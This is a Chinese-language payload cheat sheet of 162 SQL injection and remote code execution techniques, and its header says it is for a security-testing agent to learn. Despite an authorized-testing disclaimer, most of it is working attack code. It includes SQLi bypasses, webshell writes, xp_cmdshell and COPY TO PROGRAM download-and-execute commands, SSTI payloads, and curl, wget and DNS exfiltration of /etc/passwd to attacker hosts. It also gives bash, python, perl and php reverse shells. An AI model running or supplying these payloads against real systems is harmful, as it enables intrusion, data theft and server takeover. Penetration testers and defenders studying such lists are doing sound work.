# SQL 注入 + RCE 骚操作完整清单（130+ 种）

> 用途：供安全测试 Agent 逐条学习的技术清单
> ⚠️ 仅限合法授权测试、红队评估、安全研究与防御建设。授权范围内仅做漏洞存在性验证 + 最小样本，不拖库、不传 webshell、不执行命令、不做未授权 RCE。

---

# 第一篇：SQL 注入骚操作（40+ 种）

## 一、注入类型维度（8 种）

**1. 联合注入（Union）**
原理：拼接查询结果。最基础，但列数对齐是关键。
```sql
1' ORDER BY 3--         -- 先探列数
-1' UNION SELECT 1,2,3--  -- 再联合查询
```

**2. 报错注入（Error-based）**
原理：从报错信息提取数据。核心函数 `extractvalue()` / `updatexml()`。
```sql
1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- 
1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- 
```

**3. 布尔盲注（Boolean）**
原理：通过真/假判断数据，页面无回显时使用。
```sql
1' AND (SELECT length(database()))>5--   -- 返回正常=真，返回异常=假
1' AND ascii(substr((select user()),1,1))>100-- 
```

**4. 时间盲注（Time-based）**
原理：用延迟判断真/假。核心 `sleep()` / `benchmark()`。
```sql
1' AND IF(1=1,sleep(5),0)-- 
1' AND IF(ascii(substr(database(),1,1))>100,sleep(5),0)-- 
```

**5. 带外注入（OOB）**
原理：DNS/HTTP 外带数据，完全无回显时的终极手段。
```sql
SELECT LOAD_FILE(concat('\\\\',(SELECT user()),'.attacker.dnslog.cn\\a'))
```

**6. 堆叠注入（Stacked）**
原理：执行多条 SQL 语句。依赖后端 `mysqli_multi_query` 类接口。
```sql
1'; DROP TABLE users;-- 
1'; SELECT sleep(5);-- 
```

**7. 二次注入（Second-order）**
原理：数据存入时无害，取出时执行。存储无害 → 取出触发。
```sql
-- 注册用户名：admin'--
-- 之后修改密码：UPDATE users SET pwd='xxx' WHERE username='admin'--'
```

**8. 宽字节注入**
原理：GBK 编码吃掉反斜杠，绕过 `addslashes` 转义。
```sql
%df%27 OR 1=1--     -- %df 与 \ 组成汉字，' 逃逸出来
```

## 二、过滤绕过骚操作（20+ 种）

### 关键字被过滤时（6 种）

**9. 大小写混用**
```sql
sElEcT * fRoM users
```

**10. 注释拆分**
```sql
se/**/lect * from users
```

**11. 换行符插入**
```sql
se%0alect * from users    -- %0a = 换行
```

**12. 双写绕过**（WAF 只替换一次关键字）
```sql
SelEctect       -- 若替换 select 后剩 select
```

**13. URL 编码**
```sql
%53%45%4c%45%43%54   -- SELECT
```

**14. Unicode 全角字符**
```sql
ＳＥＬＥＣＴ * ＦＲＯＭ users
```

### 空格被过滤时（5 种）

**15. 注释替代空格**
```sql
SELECT/**/username/**/FROM/**/users
```

**16. 反引号替代空格**
```sql
SELECT`username`FROM`users`
```

**17. 括号替代空格**
```sql
SELECT(username)FROM(users)
```

**18. 各种空白字符**
```sql
%09  %0a  %0b  %0c  %0d  %a0   -- tab/换行/垂直tab/换页/回车/不换行空格
```

**19. 加号/减号组合**
```sql
SELECT+username+FROM+users
```

### 等号被过滤时（4 种）

**20. LIKE 替代等号**
```sql
WHERE id LIKE 1
```

**21. BETWEEN 替代等号**
```sql
WHERE id BETWEEN 1 AND 1
```

**22. IN 替代等号**
```sql
WHERE id IN(1)
```

**23. 双不等号替代等号**
```sql
WHERE NOT id>1 AND NOT id<1
```

### 引号被过滤时（2 种）

**24. Hex 编码**
```sql
WHERE username=0x61646d696e          -- 'admin'
```

**25. CHAR 函数**
```sql
WHERE username=CHAR(97,100,109,105,110)   -- 'admin'
```

## 三、各数据库特有骚操作（20+ 种）

### MySQL（约 12 种）

**26. 读文件 LOAD_FILE**
```sql
SELECT LOAD_FILE('/etc/passwd')
```

**27. 写文件 INTO OUTFILE**（⚠️ GetShell，授权测试禁止实际执行）
```sql
SELECT '<?php eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

**28. 写文件 INTO DUMPFILE**（⚠️ 同上，禁止执行）
```sql
SELECT '<?php eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php'
```

**29. extractvalue 报错注入**
```sql
extractvalue(1,concat(0x7e,(SELECT user())))
```

**30. updatexml 报错注入**
```sql
updatexml(1,concat(0x7e,(SELECT database())),1)
```

**31. floor 报错注入**
```sql
AND (SELECT 1 FROM (SELECT count(*),concat(floor(rand(0)*2),(SELECT user()))x FROM information_schema.tables GROUP BY x)a)
```

**32. IF 时间盲注**
```sql
IF(1=1,sleep(5),0)
```

**33. CASE WHEN 时间盲注**
```sql
CASE WHEN (1=1) THEN sleep(5) ELSE 0 END
```

**34. BENCHMARK 延迟（不用 sleep）**
```sql
BENCHMARK(5000000,MD5('test'))
```

**35. 无 information_schema 取表名（sys 库）**
```sql
SELECT * FROM sys.schema_table_statistics
```

**36. 无 information_schema 取表名（innodb 表）**
```sql
SELECT table_name FROM mysql.innodb_table_stats
```

**37. 查看 secure_file_priv（判断读写权限）**
```sql
SHOW VARIABLES LIKE 'secure_file_priv'
```

**38. LOAD DATA INFILE 读文件**
```sql
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp
```

### MSSQL / SQL Server（约 8 种）

**39. xp_cmdshell 命令执行**（⚠️ 直接 RCE，授权测试禁止执行）
```sql
EXEC xp_cmdshell 'whoami'
```

**40. xp_cmdshell 下载执行**（⚠️ 禁止执行）
```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'
```

**41. 开启 xp_cmdshell**（⚠️ 禁止执行）
```sql
EXEC sp_configure 'show advanced options',1;RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
```

**42. xp_dirtree 带外外带（SMB 触发）**
```sql
EXEC master..xp_dirtree '//attacker.com/smb/'
```

**43. 带外外带（拼接版本号）**
```sql
DECLARE @q varchar(1024);SET @q='\\'+@@version+'attacker.com\a';EXEC master..xp_dirtree @q
```

**44. WAITFOR 时间盲注**
```sql
WAITFOR DELAY '0:0:5'
```

**45. BULK INSERT 读文件**
```sql
BULK INSERT temp FROM 'c:\windows\win.ini'
```

**46. OPENROWSET 读文件**
```sql
SELECT * FROM OPENROWSET(BULK 'C:\windows\win.ini',SINGLE_CLOB) AS t
```

**47. 链接服务器横向移动**
```sql
SELECT * FROM OPENQUERY([linkedserver],'SELECT @@version')
```

### Oracle（约 4 种）

**48. utl_inaddr 报错注入**
```sql
SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual
```

**49. ctxsys.drithsx 报错注入**
```sql
SELECT ctxsys.drithsx.sn(1,(SELECT user FROM dual)) FROM dual
```

**50. UTL_HTTP 带外外带（最强）**
```sql
SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

**51. UTL_FILE 文件操作**
```sql
SELECT UTL_FILE.fopen('DIRECTORY','file','r') FROM dual
```

**52. dbms_pipe 时间盲注**
```sql
SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM dual
```

### PostgreSQL（约 6 种）

**53. COPY TO PROGRAM 命令执行**（⚠️ 禁止执行）
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'
```

**54. COPY 读文件**
```sql
COPY admin TO '/tmp/admin_data'
```

**55. COPY 写文件**
```sql
COPY temp FROM '/etc/passwd'
```

**56. lo_import 大对象读文件**
```sql
SELECT lo_import('/etc/passwd')
```

**57. lo_get 读取内容**
```sql
SELECT lo_get(16394)
```

**58. cast 报错注入**
```sql
SELECT cast(version() as int)
```

### SQLite（约 3 种）

**59. ATTACH 写文件**（⚠️ GetShell，禁止执行）
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS shell;
CREATE TABLE shell.a (b TEXT);
INSERT INTO shell.a VALUES('<?php eval($_POST[c]);?>');
```

**60. sqlite_master 取所有表**
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table'
```

**61. 报错/布尔配合（无信息库）**
```sql
SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1
```

## 四、高级骚操作（8 种）

**62. DNSlog 外带（完全无回显终极方案）**
```sql
SELECT LOAD_FILE(concat('\\\\',(SELECT hex(password) FROM users LIMIT 1),'.attacker.dnslog.cn\\a'))
```

**63. 绕过 information_schema（MySQL 5.7+ sys 库）**
```sql
SELECT object_name FROM `sys`.`x$schema_flattened_keys`
```

**64. 绕过 information_schema（MySQL 8.0 innodb）**
```sql
SELECT name FROM mysql.innodb_table_stats WHERE database_name=database()
```

**65. 二次注入场景**
```sql
-- 注册用户名：admin'--
-- 修改密码时变成：UPDATE users SET pwd='xxx' WHERE username='admin'--'
```

**66. 万能密码变体 1**
```sql
' OR 1=1--
```

**67. 万能密码变体 2**
```sql
' OR 'a'='a
```

**68. 万能密码变体 3（注释截断）**
```sql
admin'--
```

**69. 万能密码变体 4（括号闭合）**
```sql
') OR ('1'='1
```

**70. 万能密码变体 5（MySQL 注释）**
```sql
1' OR 1=1#
```

**71. HTTP 参数污染绕过**
```sql
?id=1&id=2 union select...   -- WAF 检测第一个，后端用第二个
```

---

# 第二篇：RCE 骚操作（50+ 种）

## 一、RCE 入口点类型（6 类）

**72. 代码执行类**：`eval`、`assert`、`preg_replace(/e)`、`call_user_func`、`array_map`

**73. 命令执行类**：`system`、`exec`、`shell_exec`、`passthru`、`popen`、`proc_open`

**74. 反序列化类**：`unserialize`、`__wakeup`、`__destruct`

**75. 文件包含类**：`include`、`require`（配合伪协议）

**76. 模板注入类**：SSTI → 各种模板引擎

**77. XML 注入类**：XXE → 文件读取 / SSRF

## 二、PHP RCE 骚操作（20 种）

### 命令执行函数（6 种）

**78. system**
```php
system('whoami');
```

**79. exec**
```php
exec('whoami', $out); print_r($out);
```

**80. shell_exec**
```php
shell_exec('whoami');
```

**81. passthru**
```php
passthru('whoami');
```

**82. 反引号执行**
```php
`whoami`;
```

**83. popen**
```php
popen('whoami','r');
```

**84. proc_open**
```php
proc_open('whoami',...);
```

### 代码执行函数（3 种）

**85. eval**
```php
eval('phpinfo();');
```

**86. assert**（PHP5 可用）
```php
assert('phpinfo()');
```

**87. preg_replace /e 修饰符**
```php
preg_replace('/.*/e','phpinfo()','');
```

### 函数回调 RCE（4 种）

**88. call_user_func**
```php
call_user_func('system','whoami');
```

**89. call_user_func_array**
```php
call_user_func_array('system',['whoami']);
```

**90. array_map**
```php
array_map('system',['whoami']);
```

**91. usort**
```php
usort([1,2], 'system');   // 输入 whoami 触发
```

### 变量函数（1 种）

**92. 变量函数调用**
```php
$func = 'system';
$func('whoami');
```

### 绕过 disable_functions（5 种，⚠️ 高风险，仅防御研究）

**93. LD_PRELOAD 劫持**
```php
putenv("LD_PRELOAD=/tmp/evil.so");
mail('a@a.com','','','');   // 触发新进程加载 so
```

**94. com_dotnet（Windows）**
```php
$com = new COM('WScript.shell');
$com->exec('whoami');
```

**95. imap_open SSRF → 命令执行**
```php
imap_open('{attacker.com:143/imap}INBOX','a','b');
```

**96. FFI 扩展（PHP 7.4+）**
```php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/output");
```

**97. ImageMagick（CVE-2016-3714 / ImageTragick）**
```
上传特殊构造图片触发命令执行
```

## 三、反序列化 RCE（20+ 种）

### PHP 反序列化链 / POP Chain（5 条链）

**98. Laravel RCE 链**
```
Illuminate\Broadcasting\PendingBroadcast
```

**99. Yii2 RCE 链**
```
yii\rest\IndexAction
```

**100. Symfony RCE 链**
```
Symfony\Component\Routing\Loader\PhpFileLoader
```

**101. ThinkPHP RCE 链**
```
think\process\pipes\Windows
```

**102. Zend RCE 链**
```
Zend 系列 Gadget
```

### Java 反序列化（5 种）

**103. Commons-Collections 链**
```
Commons-Collections 1/3/5/6/7 链
```

**104. Spring 框架链**
```
Spring framework Gadget
```

**105. Shiro RememberMe 反序列化**
```
AES key 已知即可 RCE
```

**106. Fastjson JNDI 注入**
```
影响版本 < 1.2.68
```

**107. Jackson @JsonTypeInfo 注入**
```
Jackson 多态反序列化
```

### 反序列化触发点（5 种）

**108. ObjectInputStream.readObject()**

**109. XMLDecoder**

**110. XStream**

**111. Kryo**

**112. SnakeYAML.load()**（YAML 反序列化）

## 四、SSTI 模板注入 RCE（8 种）

**113. Jinja2（Python/Flask）**
```python
{{7*7}}                    # 测试是否存在 SSTI
{{config.items()}}         # 读取配置
{{''.__class__.__mro__[1].__subclasses__()}}   # 获取所有子类
{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
```

**114. Twig（PHP）**
```twig
{{7*'7'}}   # 返回 49 说明是 Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
```

**115. Freemarker（Java）**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

**116. Velocity（Java）**
```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"whoami")
```

**117. Smarty（PHP，3 以下）**
```smarty
{$smarty.version}
{php}echo system('whoami');{/php}
```

**118. Smarty 写文件 RCE**
```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**119. Pebble（Java）**
```pebble
{% for i in range(0,1) %}
 {{"freemarker.template.utility.Execute"?new()("whoami")}}
{% endfor %}
```

## 五、文件包含 RCE（10+ 种）

### PHP 伪协议（6 种）

**120. php://filter 读源码**
```php
php://filter/read=convert.base64-encode/resource=index.php
```

**121. php://input**（POST 数据作为 PHP 代码执行）
```php
php://input
```

**122. php://filter 写文件**
```php
php://filter/write=convert.base64-decode/resource=shell.php
```

**123. data 协议**
```php
data://text/plain,<?php system('whoami');?>
```

**124. phar 反序列化触发**
```php
phar://evil.phar/test
```

**125. zip 协议包含**
```php
zip://evil.zip#shell.php
```

### 日志文件包含（3 种）

**126. nginx 日志包含**
```
UA 写入 PHP 代码 → 包含 /var/log/nginx/access.log
```

**127. apache 日志包含**
```
UA 写入 PHP 代码 → 包含 /var/log/apache2/access.log
```

**128. stderr 包含**
```
包含 /proc/self/fd/2
```

### Session / 竞争（2 种）

**129. Session 文件包含**
```
Session 路径 /var/lib/php/sessions/sess_SESSIONID
让 session 存 PHP 代码然后包含
```

**130. 条件竞争文件包含**
```
上传临时文件 + 快速包含 /tmp/phpXXXXXX
```

## 六、命令注入骚操作（20+ 种）

### 基础拼接（6 种）

**131. 分号拼接**
```bash
; whoami
```

**132. 管道拼接**
```bash
| whoami
```

**133. 或运算符拼接**
```bash
|| whoami
```

**134. 与运算符拼接**
```bash
&& whoami
```

**135. 反引号拼接**
```bash
` whoami `
```

**136. $() 命令替换**
```bash
$(whoami)
```

### 无回显外带（3 种）

**137. curl 外带**
```bash
curl http://attacker.com/$(whoami)
```

**138. wget 外带**
```bash
wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

**139. ping DNS 外带**
```bash
ping -c 1 $(whoami).attacker.dnslog.cn
```

### 绕过空格过滤（4 种）

**140. 重定向替代空格**
```bash
cat</etc/passwd
```

**141. 花括号替代空格**
```bash
{cat,/etc/passwd}
```

**142. $IFS 替代空格**
```bash
cat$IFS/etc/passwd
```

**143. 变量赋值 + \x20**
```bash
X=$'cat\x20/etc/passwd'&&$X
```

### 绕过关键字过滤（4 种）

**144. 引号拆分**
```bash
c'a't /etc/passwd
```

**145. 空命令替换**
```bash
ca$()t /etc/passwd
```

**146. 通配符**
```bash
/bin/c?t /etc/passwd
```

**147. base64 编码命令**
```bash
echo "d2hvYW1p"|base64 -d|bash
```

### 绕过黑名单（3 种）

**148. $@ 插入**
```bash
who$@ami
```

**149. 反斜杠**
```bash
wh\oami
```

**150. 十六进制 printf**
```bash
$(printf "\x77\x68\x6f\x61\x6d\x69")
```

### 反弹 Shell 大全（4 种，⚠️ 授权测试禁止执行）

**151. bash 反弹**
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**152. python3 反弹**
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

**153. perl 反弹**
```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

**154. php 反弹**
```php
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## 七、特定漏洞组合 RCE（8 种）

**155. SQL 注入 → 写 Shell → RCE**
```
MySQL INTO OUTFILE 写 webshell
```

**156. 文件上传 → 文件包含 → RCE**
```
上传图片马 + LFI 包含
```

**157. XXE → SSRF → 内网 RCE**
```
XXE 探测内网 → 打内网服务
```

**158. 反序列化 → 命令执行**
```
Shiro / Fastjson / Log4j
```

**159. SSRF → Redis 未授权 → 写计划任务 → RCE**
```
SSRF → gopher://localhost:6379/_*1...
```

**160. Log4Shell（CVE-2021-44228）**
```
${jndi:ldap://attacker.com/a} → 直接 RCE
```

**161. Spring4Shell（CVE-2022-22965）**
```
class.module.classLoader 注入 → RCE
```

**162. ThinkPHP RCE 系列**
```
/index.php?s=/index/think\app/invokefunction&function=call_user_func_array...
```

---

# 附录：总数统计

| 类别 | 编号范围 | 数量 |
|------|---------|------|
| SQL 注入类型 | 1–8 | 8 种 |
| SQL 过滤绕过 | 9–25 | 17 种 |
| 各数据库特有技巧 | 26–61 | 36 种 |
| SQL 高级骚操作 | 62–71 | 10 种 |
| RCE 入口点 | 72–77 | 6 类 |
| PHP RCE 手法 | 78–97 | 20 种 |
| 反序列化链 | 98–112 | 15 种 |
| SSTI 各引擎 | 113–119 | 7 种 |
| 文件包含技巧 | 120–130 | 11 种 |
| 命令注入绕过 | 131–154 | 24 种 |
| 漏洞组合链 | 155–162 | 8 种 |
| **合计** | **1–162** | **162 条** |

> 注：原口径 130+ 种按"类别"统计（SQL 类型 8 + 过滤绕过 20+ + 数据库特有 20+ + PHP RCE 15+ + 反序列化 20+ + SSTI 8 + 文件包含 10+ + 命令注入 20+ + 组合链 10+）。本清单按"逐条"编号，合并同类后共 **162 条**，覆盖全部内容，无遗漏。
